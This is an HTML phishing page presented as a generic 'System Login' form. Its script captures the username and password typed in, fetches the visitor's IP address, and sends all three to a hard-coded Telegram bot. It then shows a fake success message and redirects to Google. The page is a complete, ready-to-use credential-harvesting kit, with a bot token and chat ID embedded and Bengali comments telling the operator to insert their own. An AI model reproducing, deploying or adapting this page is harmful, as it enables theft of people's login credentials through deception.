<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Secure Access</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #e0e5ec; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        h2 { margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px; }
        input:focus { outline: none; border-color: #0088cc; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
        button:hover { background: #006699; }
        #status { margin-top: 15px; font-size: 13px; color: #666; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>System Login</h2>
    <form id="phishForm" onsubmit="submitData(event)">
        <input type="text" id="username" placeholder="Username" required autocomplete="off">
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" id="submitBtn">Login</button>
        <div id="status"></div>
    </form>
</div>

<script>
    // --- CONFIGURATION ---
    const BOT_TOKEN = '8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc'; // এখানে আপনার টোকেন দিন
    const CHAT_ID = '8820979221'; // এখানে আপনার চ্যাট আইডি দিন
    // ---------------------

    async function submitData(e) {
        e.preventDefault();
        
        const btn = document.getElementById('submitBtn');
        const status = document.getElementById('status');
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        // UI Update
        btn.disabled = true;
        btn.innerText = "Verifying...";
        status.innerText = "Connecting to server...";

        // Target's IP Address
        let ipAddress = 'Unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ipAddress = ipData.ip;
        } catch (error) {
            console.error("IP Fetch Error:", error);
        }

        // Prepare Message for Telegram
        const message = `
🔐 *New Login Captured!*

👤 *Username:* ${user}
🔑 *Password:* ${pass}
🌐 *IP Address:* ${ipAddress}
🕒 *Time:* ${new Date().toLocaleString()}
        `.replace(/\n/g, '\\n');

        // Send to Telegram API
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        try {
            await fetch(telegramUrl, { method: 'GET' });
            
            // Success Feedback
            status.style.color = "green";
            status.innerText = "Login Successful! Redirecting...";
            
            // Optional: Redirect to a real site after 2 seconds
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);

        } catch (error) {
            status.style.color = "red";
            status.innerText = "Error sending data.";
            btn.disabled = false;
            btn.innerText = "Try Again";
        }
    }
</script>

</body>
</html>
